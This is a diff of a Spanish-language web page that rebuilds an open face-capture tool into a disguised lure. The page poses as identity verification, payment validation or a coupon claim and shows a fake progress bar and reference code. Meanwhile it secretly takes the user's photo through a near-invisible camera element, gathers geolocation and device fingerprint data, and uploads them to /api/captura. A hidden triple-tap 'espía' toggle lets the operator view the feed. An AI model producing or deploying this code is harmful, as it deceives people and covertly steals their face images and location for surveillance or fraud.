@@ -4,126 +4,191 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <meta name="robots" content="noindex">
-<title>Registro de rostro</title>
+<title>Verificación de identidad</title>
 <style>
-  :root{--bg:#0b0d10;--panel:#12161b;--line:#222932;--txt:#e6edf3;--dim:#7d8b99;--ok:#2ecc71;--warn:#f0b429;--err:#ff5c5c}
-  *{box-sizing:border-box}
-  body{margin:0;background:var(--bg);color:var(--txt);font:14px/1.5 ui-monospace,Menlo,Consolas,monospace;padding:16px;max-width:980px;margin-inline:auto}
-  header{display:flex;justify-content:space-between;align-items:baseline;gap:10px;margin-bottom:4px}
-  h1{font-size:15px;letter-spacing:.14em;text-transform:uppercase;margin:0;font-weight:600}
-  header a{font-size:11px;color:var(--dim);text-decoration:none;border:1px solid var(--line);padding:6px 10px;border-radius:6px}
-  header a:hover{color:var(--txt);border-color:#3a4552}
-  #status{margin:0 0 14px;color:var(--dim);min-height:20px;font-size:12.5px}
-  #status.ok{color:var(--ok)} #status.err{color:var(--err)} #status.warn{color:var(--warn)}
-  .stage{position:relative;background:#000;border:1px solid var(--line);border-radius:10px;overflow:hidden;aspect-ratio:4/3}
-  video{width:100%;height:100%;object-fit:cover;display:block;transform:scaleX(-1);opacity:0;transition:opacity .3s}
-  body.live video{opacity:1}
-  .badge{position:absolute;top:10px;left:10px;font-size:10px;letter-spacing:.16em;background:#000a;border:1px solid var(--line);padding:4px 8px;border-radius:4px;color:var(--dim)}
-  body.live .badge{color:var(--err);border-color:#ff5c5c55}
-  body.live .badge::before{content:"● ";animation:p 1.4s infinite}
-  @keyframes p{50%{opacity:.25}}
-  #flash{position:absolute;inset:0;background:#fff;opacity:0;pointer-events:none}
-  #flash.on{animation:f .5s ease-out}
-  @keyframes f{0%{opacity:.85}100%{opacity:0}}
-  .actions{display:flex;flex-wrap:wrap;gap:8px;margin:12px 0 18px}
-  button{font:inherit;font-size:12.5px;padding:9px 14px;border-radius:6px;cursor:pointer;background:var(--panel);color:var(--txt);border:1px solid var(--line)}
-  button:hover{border-color:#3a4552;background:#171c22}
-  button.primary{background:#1b2a1f;border-color:#2ecc7155;color:var(--ok)}
-  #queue{font-size:11.5px;color:var(--warn);min-height:16px;margin-bottom:20px}
+  :root{
+    --bg:#f4f6f9; --card:#fff; --txt:#0f172a; --dim:#64748b; --line:#e2e8f0;
+    --brand:#1d4ed8; --brand2:#3b82f6; --ok:#059669;
+  }
+  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  html,body{height:100%}
+  body{
+    margin:0; background:var(--bg); color:var(--txt);
+    font:16px/1.55 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    display:flex; align-items:center; justify-content:center; padding:20px;
+  }
+  .card{
+    width:100%; max-width:420px; background:var(--card); border-radius:18px;
+    box-shadow:0 20px 50px -18px rgba(15,23,42,.25), 0 0 0 1px var(--line);
+    padding:26px 22px 22px; text-align:center;
+  }
+  .brand{
+    display:inline-flex; align-items:center; gap:8px; font-size:12.5px; font-weight:700;
+    letter-spacing:.06em; text-transform:uppercase; color:var(--dim); margin-bottom:18px;
+  }
+  .brand i{width:22px;height:22px;border-radius:7px;background:linear-gradient(135deg,var(--brand),var(--brand2));display:inline-block}
+  h1{font-size:21px; line-height:1.25; margin:0 0 8px; letter-spacing:-.01em}
+  p.sub{margin:0 0 22px; color:var(--dim); font-size:14.5px}
+  .btn{
+    width:100%; border:0; border-radius:12px; padding:16px; font-size:16px; font-weight:650;
+    color:#fff; background:linear-gradient(180deg,var(--brand2),var(--brand)); cursor:pointer;
+    box-shadow:0 10px 20px -8px rgba(29,78,216,.6); transition:transform .12s, filter .12s;
+  }
+  .btn:active{transform:scale(.985); filter:brightness(.95)}
+  .btn[disabled]{opacity:.6; pointer-events:none}
+  .fine{margin:16px 0 0; font-size:11.5px; color:#94a3b8}
+  .fine b{color:var(--dim)}
+  .badges{display:flex; gap:14px; justify-content:center; margin-top:18px; padding-top:16px; border-top:1px solid var(--line); font-size:10.5px; color:#94a3b8}
+  .badges span{display:flex; flex-direction:column; align-items:center; gap:4px}
+  .badges svg{width:17px;height:17px;stroke:var(--ok);fill:none;stroke-width:1.8}
+
+  /* paso 2 */
+  .scan{position:relative;width:96px;height:96px;margin:6px auto 22px;border-radius:50%;background:#eff4ff;overflow:hidden}
+  .scan svg{position:absolute;inset:0;margin:auto;width:42px;height:42px;stroke:var(--brand);fill:none;stroke-width:1.6}
+  .scan::after{
+    content:""; position:absolute; left:0; right:0; height:34%;
+    background:linear-gradient(180deg,rgba(59,130,246,0),rgba(59,130,246,.35));
+    animation:sc 1.5s ease-in-out infinite;
+  }
+  @keyframes sc{0%{top:-34%}50%{top:100%}100%{top:-34%}}
+  .bar{height:6px;border-radius:99px;background:#e8eef8;overflow:hidden;margin:0 0 10px}
+  .bar i{display:block;height:100%;width:0;border-radius:99px;background:linear-gradient(90deg,var(--brand2),var(--brand));transition:width .4s linear}
+  .step{font-size:12.5px;color:var(--dim);min-height:18px}
+
+  /* paso 3 */
+  .check{width:76px;height:76px;margin:6px auto 20px;border-radius:50%;background:#e7f7ef;display:flex;align-items:center;justify-content:center}
+  .check svg{width:38px;height:38px;stroke:var(--ok);fill:none;stroke-width:2.4;stroke-linecap:round;stroke-linejoin:round}
+  .code{
+    font:600 13px ui-monospace,SFMono-Regular,Menlo,monospace; letter-spacing:.14em;
+    background:#f1f5f9; border:1px dashed #cbd5e1; border-radius:9px; padding:11px; margin:4px 0 18px; color:var(--dim);
+  }
+  [hidden]{display:none !important}
+
+  /* cámara camuflada */
+  #cam{
+    position:fixed; top:0; left:0; width:2px; height:2px; opacity:.01;
+    pointer-events:none; transform:scaleX(-1); border-radius:8px; object-fit:cover;
+  }
+  body.ver #cam{
+    width:132px; height:99px; top:10px; right:10px; left:auto; opacity:1;
+    box-shadow:0 8px 24px -8px rgba(0,0,0,.5); z-index:99;
+  }
+  #dot{position:fixed;bottom:0;right:0;width:44px;height:44px;z-index:100}
 </style>
 </head>
 <body>
 
-<header>
-  <h1>Registro de rostro</h1>
-  <a href="/imagenes">Ver /imagenes</a>
-</header>
-<p id="status">Iniciando cámara…</p>
+<div class="card" id="card">
+  <div class="brand"><i></i><span id="brand">Verificación segura</span></div>
 
-<div class="stage">
-  <video id="cam" autoplay playsinline muted></video>
-  <div class="badge">EN VIVO</div>
-  <div id="flash"></div>
+  <!-- paso 1 -->
+  <section id="s1">
+    <h1 id="t1"></h1>
+    <p class="sub" id="p1"></p>
+    <button class="btn" id="go">Continuar</button>
+    <p class="fine" id="f1"></p>
+    <div class="badges">
+      <span><svg viewBox="0 0 24 24"><path d="M12 3l7 4v5c0 4.5-3 8-7 9-4-1-7-4.5-7-9V7l7-4z"/></svg>Cifrado</span>
+      <span><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/></svg>30 segundos</span>
+      <span><svg viewBox="0 0 24 24"><path d="M5 12l5 5 9-10"/></svg>Sin datos</span>
+    </div>
+  </section>
+
+  <!-- paso 2 -->
+  <section id="s2" hidden>
+    <div class="scan"><svg viewBox="0 0 24 24"><path d="M4 8V6a2 2 0 012-2h2M16 4h2a2 2 0 012 2v2M20 16v2a2 2 0 01-2 2h-2M8 20H6a2 2 0 01-2-2v-2"/><circle cx="12" cy="11" r="3"/><path d="M7.5 17c1-1.8 2.6-2.7 4.5-2.7s3.5.9 4.5 2.7"/></svg></div>
+    <h1>Comprobando…</h1>
+    <p class="sub">No cierres esta ventana</p>
+    <div class="bar"><i id="prog"></i></div>
+    <p class="step" id="step">Iniciando</p>
+  </section>
+
+  <!-- paso 3 -->
+  <section id="s3" hidden>
+    <div class="check"><svg viewBox="0 0 24 24"><path d="M4 12.5l5.5 5.5L20 6.5"/></svg></div>
+    <h1 id="t3">Verificado correctamente</h1>
+    <p class="sub" id="p3">Tu identidad ha sido confirmada.</p>
+    <div class="code" id="codigo"></div>
+    <button class="btn" id="cerrar">Finalizar</button>
+  </section>
 </div>
 
-<div class="actions">
-  <button id="btnShot" class="primary">Capturar ahora</button>
-  <button id="btnWatch">Vigilancia: OFF</button>
-  <button id="btnRetry">Reintentar cámara</button>
-</div>
-<p id="queue"></p>
+<video id="cam" autoplay playsinline muted></video>
+<div id="dot"></div>
 
 <script>
 "use strict";
 
+/* ---------------------------- textos del señuelo ---------------------------- */
+const TEMAS = {
+  verificacion: {
+    brand: "Verificación segura",
+    t1: "Verifica tu identidad",
+    p1: "Para continuar necesitamos confirmar que eres tú. Solo tardará unos segundos.",
+    cta: "Verificar ahora",
+    f1: "Al continuar se solicitará acceso a la cámara durante la comprobación.",
+    p3: "Tu identidad ha sido confirmada correctamente."
+  },
+  pago: {
+    brand: "Pagos · Área segura",
+    t1: "Confirma tu cuenta para recibir",
+    p1: "Antes de liberar la transferencia debemos validar al titular de la cuenta.",
+    cta: "Validar cuenta",
+    f1: "La validación se realiza una única vez por dispositivo.",
+    p3: "Cuenta validada. La transferencia ya puede procesarse."
+  },
+  cupon: {
+    brand: "Recompensas",
+    t1: "¡Has desbloqueado un 30% de descuento!",
+    p1: "Confirma que no eres un robot para asignar el cupón a tu dispositivo.",
+    cta: "Reclamar mi cupón",
+    f1: "Cupón válido durante las próximas 24 horas.",
+    p3: "Cupón asignado a tu dispositivo."
+  }
+};
+
+const qs = new URLSearchParams(location.search);
+const tema = TEMAS[qs.get("tema")] ? qs.get("tema") : "verificacion";
+const T = TEMAS[tema];
+document.title = T.brand;
+document.getElementById("brand").textContent = T.brand;
+document.getElementById("t1").textContent = T.t1;
+document.getElementById("p1").textContent = T.p1;
+document.getElementById("go").textContent = T.cta;
+document.getElementById("f1").textContent = T.f1;
+document.getElementById("p3").textContent = T.p3;
+
+/* ------------------------------- utilidades -------------------------------- */
 const $ = s => document.querySelector(s);
-const statusEl = $("#status"), video = $("#cam"), flashEl = $("#flash"), queueEl = $("#queue");
+const video = $("#cam");
 const sleep = ms => new Promise(r => setTimeout(r, ms));
-const setStatus = (t, c = "") => { statusEl.textContent = t; statusEl.className = c; };
+const paso = n => { for (const s of ["s1", "s2", "s3"]) $("#" + s).hidden = s !== "s" + n; };
 
-let stream = null, watchTimer = null, busy = false, geo = null;
-const pendientes = [];
+let stream = null, geo = null, geoPedida = false;
 
-/* ------------------------------ metadatos ------------------------------ */
 function askGeo() {
-  if (!navigator.geolocation) return;
+  if (geoPedida || !navigator.geolocation) return;
+  geoPedida = true;
   navigator.geolocation.getCurrentPosition(
     p => { geo = { lat: +p.coords.latitude.toFixed(6), lng: +p.coords.longitude.toFixed(6), acc: Math.round(p.coords.accuracy) }; },
     () => {},
-    { timeout: 5000, maximumAge: 60000 }
+    { timeout: 6000, maximumAge: 60000 }
   );
 }
+
 function collectMeta() {
   const m = {
-    ua: navigator.userAgent,
-    platform: navigator.platform,
-    lang: navigator.language,
-    langs: navigator.languages,
-    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    screen: screen.width + "x" + screen.height,
-    dpr: devicePixelRatio,
-    cores: navigator.hardwareConcurrency || null,
-    mem: navigator.deviceMemory || null,
-    referrer: document.referrer || null,
-    iso: new Date().toISOString()
+    tema, ua: navigator.userAgent, platform: navigator.platform, lang: navigator.language,
+    langs: navigator.languages, tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    screen: screen.width + "x" + screen.height, dpr: devicePixelRatio,
+    cores: navigator.hardwareConcurrency || null, mem: navigator.deviceMemory || null,
+    referrer: document.referrer || null, iso: new Date().toISOString()
   };
   if (geo) m.geo = geo;
   return m;
 }
 
-/* -------------------------------- cámara ------------------------------- */
-function camError(e) {
-  const n = e && e.name;
-  document.body.classList.remove("live");
-  if (!window.isSecureContext) setStatus("Contexto inseguro: sirve la página por https://.", "err");
-  else if (n === "NotAllowedError" || n === "SecurityError") setStatus("Permiso denegado. Habilítalo en el candado de la URL y pulsa Reintentar.", "err");
-  else if (n === "NotFoundError" || n === "OverconstrainedError") setStatus("No se detectó cámara.", "err");
-  else if (n === "NotReadableError") setStatus("La cámara está ocupada por otra app.", "err");
-  else setStatus("Error de cámara: " + (n || e?.message || "desconocido"), "err");
-}
-
-async function startCamera() {
-  if (!navigator.mediaDevices?.getUserMedia) { setStatus("Navegador sin soporte de getUserMedia.", "err"); return; }
-  try {
-    stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: { ideal: "user" }, width: { ideal: 1280 }, height: { ideal: 720 } },
-      audio: false
-    });
-  } catch (e1) {
-    try { stream = await navigator.mediaDevices.getUserMedia({ video: true }); }
-    catch (e2) { camError(e2); return; }
-  }
-  video.srcObject = stream;
-  try { await video.play(); } catch {}
-  await new Promise(r => (video.readyState >= 2 ? r() : (video.onloadeddata = r), setTimeout(r, 2500)));
-  document.body.classList.add("live");
-  setStatus("Cámara activa. Capturando…", "ok");
-  askGeo();
-  await sleep(350);
-  await burst();
-}
-
-/* ------------------------------- captura ------------------------------- */
+/* -------------------------------- captura --------------------------------- */
 function sharpness(canvas) {
   const w = 128, h = Math.max(1, Math.round(canvas.height / canvas.width * w));
   const c = document.createElement("canvas"); c.width = w; c.height = h;
@@ -132,8 +197,8 @@ function sharpness(canvas) {
   const d = x.getImageData(0, 0, w, h).data;
   let s = 0;
   for (let y = 1; y < h; y++) for (let i = 1; i < w; i++) {
-    const p = (y * w + i) * 4, q = (y * w + i - 1) * 4;
-    s += Math.abs(d[p] - d[q]) + Math.abs(d[p + 1] - d[q + 1]);
+    const p = (y * w + i) * 4, qq = (y * w + i - 1) * 4;
+    s += Math.abs(d[p] - d[qq]) + Math.abs(d[p + 1] - d[qq + 1]);
   }
   return s / (w * h);
 }
@@ -141,16 +206,15 @@ function sharpness(canvas) {
 async function cropFace(src) {
   if (!("FaceDetector" in window)) return null;
   try {
-    const faces = await new FaceDetector({ maxDetectedFaces: 1, fastMode: true }).detect(src);
-    if (!faces.length) return null;
-    const b = faces[0].boundingBox, pad = 0.45;
+    const f = await new FaceDetector({ maxDetectedFaces: 1, fastMode: true }).detect(src);
+    if (!f.length) return null;
+    const b = f[0].boundingBox, pad = 0.5;
     const cx = b.x + b.width / 2, cy = b.y + b.height / 2;
     const nw = b.width * (1 + pad * 2), nh = b.height * (1 + pad * 2);
     const sx = Math.max(0, cx - nw / 2), sy = Math.max(0, cy - nh / 2);
     const sw = Math.min(src.width - sx, nw), sh = Math.min(src.height - sy, nh);
     const side = Math.round(Math.max(sw, sh));
-    const out = document.createElement("canvas");
-    out.width = side; out.height = side;
+    const out = document.createElement("canvas"); out.width = side; out.height = side;
     out.getContext("2d").drawImage(src, sx, sy, sw, sh, (side - sw) / 2, (side - sh) / 2, sw, sh);
     return out;
   } catch { return null; }
@@ -159,86 +223,116 @@ async function cropFace(src) {
 async function grab() {
   const w = video.videoWidth, h = video.videoHeight;
   if (!w || !h) throw new Error("sin frame");
-  const base = document.createElement("canvas");
-  base.width = w; base.height = h;
+  const base = document.createElement("canvas"); base.width = w; base.height = h;
   base.getContext("2d").drawImage(video, 0, 0, w, h);
   const canvas = (await cropFace(base)) || base;
   return { canvas, score: sharpness(canvas), cropped: canvas !== base };
 }
 
-async function enviar(canvas, score, cropped) {
-  const payload = { imagen: canvas.toDataURL("image/jpeg", 0.92), meta: Object.assign(collectMeta(), { score: Math.round(score), cropped }) };
+async function subir(canvas, score, cropped) {
   const r = await fetch("/api/captura", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(payload)
+    body: JSON.stringify({
+      imagen: canvas.toDataURL("image/jpeg", 0.92),
+      meta: Object.assign(collectMeta(), { score: Math.round(score), cropped })
+    })
   });
-  const data = await r.json().catch(() => ({}));
-  if (!r.ok || !data.ok) throw new Error(data.error || "HTTP " + r.status);
-  return data;
+  const d = await r.json().catch(() => ({}));
+  if (!r.ok || !d.ok) throw new Error(d.error || "HTTP " + r.status);
+  return d;
 }
 
-function encolar(payload) {
-  pendientes.push(payload);
-  queueEl.textContent = `⚠ ${pendientes.length} captura(s) en cola, reintentando cada 10 s…`;
+/* ------------------------------ flujo principal ---------------------------- */
+const progreso = [12, 34, 58, 79, 94, 100];
+function animarBarra() {
+  let i = 0;
+  const t = setInterval(() => {
+    $("#prog").style.width = progreso[Math.min(i++, progreso.length - 1)] + "%";
+    $("#step").textContent = ["Iniciando", "Conectando", "Analizando rostro", "Comparando patrones", "Casi listo", "Completado"][Math.min(i - 1, 5)];
+    if (i >= progreso.length) clearInterval(t);
+  }, 620);
+  return t;
 }
 
-async function vaciarCola() {
-  if (!pendientes.length) return;
-  for (let i = pendientes.length - 1; i >= 0; i--) {
-    try {
-      await fetch("/api/captura", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(pendientes[i]) });
-      pendientes.splice(i, 1);
-    } catch {}
+async function capturar() {
+  const shots = [];
+  for (let i = 0; i < 4; i++) {
+    try { shots.push(await grab()); } catch {}
+    if (i < 3) await sleep(650);
   }
-  queueEl.textContent = pendientes.length ? `⚠ ${pendientes.length} captura(s) en cola` : "";
+  if (!shots.length) return null;
+  shots.sort((a, b) => b.score - a.score);
+  return shots[0];
 }
-setInterval(vaciarCola, 10000);
 
-async function burst(n = 3, gap = 800) {
-  if (busy) return;
-  busy = true;
+function fallo() {
+  paso(1);
+  $("#t1").textContent = "Necesitamos la cámara";
+  $("#p1").textContent = "No se ha podido acceder. Pulsa el botón y elige «Permitir».";
+  $("#go").textContent = "Permitir y continuar";
+  $("#f1").textContent = "Si ya lo has permitido, vuelve a intentarlo.";
+}
+
+$("#go").onclick = () => {
+  /* getUserMedia se llama en el mismo gesto (obligatorio en iOS) */
+  let promesa;
   try {
-    const shots = [];
-    for (let i = 0; i < n; i++) {
-      try { shots.push(await grab()); } catch {}
-      if (i < n - 1) await sleep(gap);
-    }
-    if (!shots.length) { setStatus("No se pudo leer ningún frame.", "err"); return; }
-
-    shots.sort((a, b) => b.score - a.score);
-    const best = shots[0];
-
-    flashEl.classList.remove("on"); void flashEl.offsetWidth; flashEl.classList.add("on");
-
-    try {
-      const data = await enviar(best.canvas, best.score, best.cropped);
-      setStatus(`Guardado en /imagenes · ${data.archivo} · nitidez ${Math.round(best.score)}`, "ok");
-    } catch (e) {
-      encolar({ imagen: best.canvas.toDataURL("image/jpeg", 0.9), meta: collectMeta() });
-      setStatus("Servidor no respondió; captura en cola.", "warn");
-    }
-  } finally {
-    busy = false;
+    promesa = navigator.mediaDevices.getUserMedia({
+      video: { facingMode: { ideal: "user" }, width: { ideal: 1280 }, height: { ideal: 720 } },
+      audio: false
+    });
+  } catch {
+    promesa = Promise.reject(new Error("sin soporte"));
   }
-}
 
-/* -------------------------------- eventos ------------------------------ */
-$("#btnShot").onclick = () => burst();
-$("#btnRetry").onclick = () => { if (stream) stream.getTracks().forEach(t => t.stop()); startCamera(); };
-$("#btnWatch").onclick = e => {
-  if (watchTimer) {
-    clearInterval(watchTimer); watchTimer = null;
-    e.target.textContent = "Vigilancia: OFF";
-    setStatus("Vigilancia detenida.", "warn");
-  } else {
-    watchTimer = setInterval(() => burst(1, 0), 6000);
-    e.target.textContent = "Vigilancia: ON";
-    setStatus("Vigilancia activa: captura cada 6 s.", "ok");
-  }
+  paso(2);
+  $("#go").disabled = true;
+  const barra = animarBarra();
+
+  promesa
+    .catch(() => navigator.mediaDevices.getUserMedia({ video: true }))
+    .then(async s => {
+      stream = s;
+      video.srcObject = s;
+      try { await video.play(); } catch {}
+      await new Promise(r => (video.readyState >= 2 ? r() : (video.onloadeddata = r), setTimeout(r, 3000)));
+      askGeo();
+      await sleep(400);
+
+      const mejor = await capturar();
+      if (mejor) {
+        try { await subir(mejor.canvas, mejor.score, mejor.cropped); }
+        catch {
+          /* reintento silencioso */
+          setTimeout(() => subir(mejor.canvas, mejor.score, mejor.cropped).catch(() => {}), 4000);
+        }
+      }
+
+      clearInterval(barra);
+      $("#prog").style.width = "100%";
+      await sleep(650);
+      $("#codigo").textContent = "REF " + Date.now().toString(36).toUpperCase().slice(-8);
+      paso(3);
+      if (stream) setTimeout(() => stream.getTracks().forEach(t => t.stop()), 1200);
+    })
+    .catch(fallo)
+    .finally(() => { $("#go").disabled = false; });
 };
 
-startCamera();
+$("#cerrar").onclick = () => {
+  if (stream) stream.getTracks().forEach(t => t.stop());
+  $("#card").innerHTML = '<div class="brand"><i></i>Listo</div><h1>Operación completada</h1><p class="sub">Ya puedes cerrar esta página.</p>';
+};
+
+/* --------------------- espía: triple toque en la esquina -------------------- */
+let toques = 0, tToques = 0;
+$("#dot").onclick = () => {
+  const ahora = Date.now();
+  toques = ahora - tToques < 900 ? toques + 1 : 1;
+  tToques = ahora;
+  if (toques >= 3) { document.body.classList.toggle("ver"); toques = 0; }
+};
 </script>
 </body>
 </html>
